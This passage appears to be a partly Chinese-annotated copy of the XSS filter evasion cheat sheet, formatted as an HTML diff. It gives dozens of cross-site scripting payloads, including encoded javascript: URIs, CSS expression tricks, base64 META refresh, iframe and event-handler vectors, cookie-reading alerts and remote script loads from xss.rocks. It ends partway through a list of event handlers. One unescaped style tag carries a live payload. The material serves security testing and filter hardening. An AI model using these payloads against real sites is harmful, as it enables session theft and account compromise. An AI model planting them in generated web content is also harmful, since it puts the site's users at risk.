+<p>This is also a viable XSS attack against the above string <code class="highlighter-rouge">$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/;</code> which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="embedded-tab">Embedded tab</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC="jav	ascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="embedded-encoded-tab">Embedded Encoded tab</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="embedded-newline-to-break-up-xss">Embedded newline to break up XSS</h3>
+
+<p>Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="embedded-carriage-return-to-break-up-xss">Embedded carriage return to break up XSS</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="null-breaks-up-javascript-directive">Null breaks up JavaScript directive</h3>
+
+<p>Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use <code class="highlighter-rouge">%00</code> in the URL string or if you want to write your own injection tool you can either use vim (<code class="highlighter-rouge">^V^@</code> will produce a null) or the following program to generate it into a text file.</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre><span class="k">print</span> <span class="s">"&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;"</span><span class="p">;</span>
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="spaces-and-meta-chars-before-the-javascript-in-images-for-xss">Spaces and meta chars before the JavaScript in images for XSS</h3>
+
+<p>有的系统假设 <code class="highlighter-rouge">"javascript:"</code> 的引号内没有空格之类的字符，只做全匹配。</p>
+
+<p>就可以使用 1～32 的任一字符注入：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="escaping-javascript-escapes">Escaping JavaScript escapes</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>\";alert('XSS');//
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<p>被服务器端直接用于js <code class="highlighter-rouge">&lt;SCRIPT&gt;var a="$ENV{QUERY_STRING}";&lt;/SCRIPT&gt;</code> 中，就可能变成</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;SCRIPT&gt;var a="\\";alert('XSS');//";&lt;/SCRIPT&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<p>也可以使用 <code class="highlighter-rouge">&lt;/script&gt;&lt;script&gt;</code> 嵌入新的script元素，效果如下：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="end-title-tag">End title tag</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="input-image">INPUT image</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="body-image">BODY image</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="img-dynsrc">IMG Dynsrc</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="img-lowsrc">IMG lowsrc</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="从-tag-注入">从 Tag 注入</h3>
+
+<h4 id="svg-object-tag">SVG object tag</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;svg/onload=alert('XSS')&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="从css注入">从CSS注入</h3>
+
+<h4 id="list-style-image">List-style-image</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="style-sheet">STYLE sheet</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="remote-style-sheet">Remote style sheet</h4>
+
+<p>This only works in IE and Netscape 8.1+ in IE rendering engine mode.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;LINK REL="stylesheet" HREF="http://xss.rocks/xss.css"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="remote-style-sheet-part-2">Remote style sheet part 2</h4>
+
+<p>As a side note, you can remove the end &lt;/STYLE&gt; tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;STYLE&gt;@import'http://xss.rocks/xss.css';&lt;/STYLE&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="remote-style-sheet-part-3">Remote style sheet part 3</h4>
+
+<p>According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera).</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="remote-style-sheet-part-4">Remote style sheet part 4</h4>
+
+<p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;STYLE&gt;BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}&lt;/STYLE&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="style-tags-with-broken-up-javascript-for-xss">STYLE tags with broken up JavaScript for XSS</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="style-attribute-using-a-comment-to-break-up-expression">STYLE attribute using a comment to break up expression</h4>
+
+<p>Created by Roman Ivanov</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="img-style-with-expression">IMG STYLE with expression</h4>
+
+<p>This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2</pre></td><td class="code"><pre>exp/*&lt;A STYLE='no\xss:noxss("*//*");
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="style-tag-using-background-image">STYLE tag using background-image</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="style-tag-using-background">STYLE tag using background</h4>
+
+<style type="text/css">BODY{background:url("javascript:alert('XSS')")}</style>
+
+<h4 id="anonymous-html-with-style-attribute">Anonymous HTML with STYLE attribute</h4>
+
+<p>IE6.0 and Netscape 8.1+ in IE rendering engine mode don’t really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="us-ascii-encoding">US-ASCII encoding</h3>
+
+<p>US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>¼script¾alert(¢XSS¢)¼/script¾
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="meta">META</h3>
+
+<p>The odd thing about meta refresh is that it doesn’t send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="meta-using-data">META using data</h4>
+
+<p>Directive URL scheme. This is nice because it also doesn’t have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<p><code class="highlighter-rouge">PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</code> base64 decode: <code class="highlighter-rouge">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+
+<h4 id="meta-with-additional-url-parameter">META with additional URL parameter</h4>
+
+<p>If the target website attempts to see if the URL contains “http://” at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="iframe">IFRAME</h3>
+
+<p>If iframes are allowed there are a lot of other XSS problems as well:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="iframe-event-based">IFRAME Event based</h4>
+
+<p>IFrames and most other elements can use event based mayhem like the following… (Submitted by: David Cross)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="frame">FRAME</h4>
+
+<p>Frames have the same sorts of XSS problems as iframes</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="table">TABLE</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="td">TD</h4>
+
+<p>Just like above, TD’s are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="div">DIV</h3>
+
+<h4 id="div-background-image">DIV background-image</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="div-background-image-with-unicoded-xss-exploit">DIV background-image with unicoded XSS exploit</h4>
+
+<p>This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="ecmascript-6">ECMAScript 6</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>Set.constructor`alert\x28document.domain\x29```
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="body-tag">BODY tag</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;BODY ONLOAD=alert('XSS')&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="vbscript">VBScript</h3>
+
+<h4 id="vbscript-in-an-image">VBscript in an image</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="利用浏览器兼容的语法错误">利用浏览器兼容的语法错误</h3>
+
+<h4 id="malformed-a-tags">Malformed A tags</h4>
+
+<p>Chrome loves to replace missing quotes for you…</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt; 
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="malformed-img-tags">Malformed IMG tags</h4>
+
+<p>Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="non-alpha-non-digit-xss">Non-alpha-non-digit XSS</h4>
+
+<p>一些非字母非数字的字符会被浏览器无视。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="extraneous-open-brackets">Extraneous open brackets</h4>
+
+<p>Submitted by Franz Sedlmaier, 这种方法能搞定匹配尖括号的XSS过滤。</p>
+
+<ul>
+  <li>下例 <code class="highlighter-rouge">//</code> 用来避免js报错：
+    <div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>  &lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
+</pre></td></tr></tbody></table>
+</div>
+    </div>
+  </li>
+</ul>
+
+<h4 id="no-closing-script-tags">No closing script tags</h4>
+
+<p>Firefox assumes it’s safe to close the HTML tag and add closing tags for you.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="protocol-resolution-in-script-tags">Protocol resolution in script tags</h4>
+
+<p>This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a <code class="highlighter-rouge">&lt;/SCRIPT&gt;</code> tag at the end.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;SCRIPT SRC=//xss.rocks/.j&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="half-open-htmljavascript-xss-vector">Half open HTML/JavaScript XSS vector</h4>
+
+<p>Unlike Firefox the IE rendering engine doesn’t add extra data to your page, but it does allow the <code class="highlighter-rouge">javascript:</code> directive in images.</p>
+
+<p>This is useful as a vector because it doesn’t require a close angle bracket.</p>
+
+<p>也可以用 <code class="highlighter-rouge">&lt;IFRAME</code> 代替 <code class="highlighter-rouge">&lt;IMG</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC="javascript:alert('XSS')"
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="double-open-angle-brackets">Double open angle brackets</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="bgsound">BGSOUND</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="-javascript-includes">&amp; JavaScript includes</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;BR SIZE="&amp;{alert('XSS')}"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h2 id="event-handlers">Event Handlers</h2>
+
+<ul>
+  <li>FSCommand() (attacker can use this when executed from within an embedded Flash object)</li>
+  <li>onAbort() (when user aborts the loading of an image)</li>
+  <li>onActivate() (when object is set as the active element)</li>
+  <li>onAfterPrint() (activates after user prints or previews print job)</li>
+  <li>onAfterUpdate() (activates on data object after updating data in the source object)</li>
+  <li>onBeforeActivate() (fires before the object is set as the active element)</li>
+  <li>onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand(“Copy”) function)</li>
+  <li>onBeforeCut() (attacker executes the attack string right before a selection is cut)</li>
+  <li>onBeforeDeactivate() (fires right after the activeElement is changed from the current object)</li>
+  <li>onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)</li>
+  <li>onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand(“Paste”) function)</li>
+  <li>onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand(“Print”) function).</li>
+  <li>onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)</li>
+  <li>onBeforeUpdate() (activates on data object before updating data in the source object)</li>
+  <li>onBegin() (the onbegin event fires immediately when the element’s timeline begins)</li>
+  <li>onBlur() (in the case where another popup is loaded and window looses focus)</li>
+  <li>onBounce() (fires when the behavior property of the marquee object is set to “alternate” and the contents of the marquee reach one side of the window)</li>
+  <li>onCellChange() (fires when data changes in the data provider)</li>
+  <li>onChange() (select, text, or TEXTAREA field loses focus and its value has been modified)</li>
+  <li>onClick() (someone clicks on a form)</li>
+  <li>onContextMenu() (user would need to right click on attack area)</li>
+  <li>onControlSelect() (fires when the user is about to make a control selection of the object)</li>
+  <li>onCopy() (user needs to copy something or it can be exploited using the execCommand(“Copy”) command)</li>
+  <li>onCut() (user needs to copy something or it can be exploited using the execCommand(“Cut”) command)</li>
+  <li>onDataAvailable() (user would need to change data in an element, or attacker could perform the same function)</li>
+  <li>onDataSetChanged() (fires when the data set exposed by a data source object changes)</li>
+  <li>onDataSetComplete() (fires to indicate that all data is available from the data source object)</li>
+  <li>onDblClick() (user double-clicks a form element or a link)</li>
+  <li>onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document)</li>
+  <li>onDrag() (requires that the user drags an object)</li>
+  <li>onDragEnd() (requires that the user drags an object)</li>
+  <li>onDragLeave() (requires that the user drags an object off a valid location)</li>
+  <li>onDragEnter() (requires that the user drags an object into a valid location)</li>
+  <li>onDragOver() (requires that the user drags an object into a valid location)</li>
+  <li>onDragDrop() (user drops an object (e.g. file) onto the browser window)</li>
+  <li>onDragStart() (occurs when user starts drag operation)</li>
+  <li>onDrop() (user drops an object (e.g. file) onto the browser window)</li>
+  <li>onEnd() (the onEnd event fires when the timeline ends.</li>
+  <li>onError() (loading of a document or image causes an error)</li>
+  <li>onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)</li>
+  <li>onFilterChange() (fires when a visual filter completes state change)</li>
+  <li>onFinish() (attacker can create the exploit when marquee is finished looping)</li>
+  <li>onFocus() (attacker executes the attack string when the window gets focus)</li>
+  <li>onFocusIn() (attacker executes the attack string when window gets focus)</li>
+  <li>onFocusOut() (attacker executes the attack string when window looses focus)</li>
+  <li>onHashChange() (fires when the fragment identifier part of the document’s current address changed)</li>
+  <li>onHelp() (attacker executes the attack string when users hits F1 while the window is in focus)</li>
+  <li>onInput() (the text content of an element is changed through the user interface)</li>
+  <li>onKeyDown() (user depresses a key)</li>
+  <li>onKeyPress() (user presses or holds down a key)</li>
+  <li>onKeyUp() (user releases a key)</li>
+  <li>onLayoutComplete() (user would have to print or print preview)</li>
+  <li>onLoad() (attacker executes the attack string after the window loads)</li>
+  <li>onLoseCapture() (can be exploited by the releaseCapture() method)</li>
+  <li>onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing)</li>
+  <li>onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem)</li>
+  <li>onMessage() (fire when the document received a message)</li>
+  <li>onMouseDown() (the attacker would need to get the user to click on an image)</li>
+  <li>onMouseEnter() (cursor moves over an object or area)</li>
+  <li>onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again)</li>
+  <li>onMouseMove() (the attacker would need to get the user to mouse over an image or table)</li>
+  <li>onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again)</li>
+  <li>onMouseOver() (cursor moves over an object or area)</li>
+  <li>onMouseUp() (the attacker would need to get the user to click on an image)</li>
+  <li>onMouseWheel() (the attacker would need to get the user to use their mouse wheel)</li>
+  <li>onMove() (user or attacker would move the page)</li>
+  <li>onMoveEnd() (user or attacker would move the page)</li>
+  <li>onMoveStart() (user or attacker would move the page)</li>
+  <li>onOffline() (occurs if the browser is working in online mode and it starts to work offline)</li>
+  <li>onOnline() (occurs if the browser is working in offline mode and it starts to work online)</li>
+  <li>onOutOfSync() (interrupt the element’s ability to play its media as defined by the timeline)</li>
